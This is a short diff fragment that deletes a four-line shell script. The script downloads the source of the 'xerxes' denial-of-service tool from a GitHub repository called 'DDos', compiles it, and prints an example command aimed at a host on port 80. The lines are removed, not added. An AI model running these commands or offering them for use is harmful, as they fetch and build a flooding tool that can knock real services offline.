@@ -1,4 +1,0 @@
-wget https://raw.githubusercontent.com/maellambong/DDos/master/x/xerxes.c
-clang xerxes.c -o xerxes
-echo "example usage : ./xerxes www.test.com 80"
-exit
